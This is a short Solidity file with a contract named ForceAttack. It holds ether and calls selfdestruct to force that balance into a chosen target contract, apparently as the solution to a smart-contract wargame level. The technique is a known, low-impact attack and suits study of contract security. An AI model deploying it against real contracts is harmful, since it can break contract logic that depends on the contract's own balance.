pragma solidity ^0.5.0;

contract ForceAttack {

  constructor() public payable {}
  function() external payable {}

  function attack(address payable target) public {
    selfdestruct(target);
  }
}
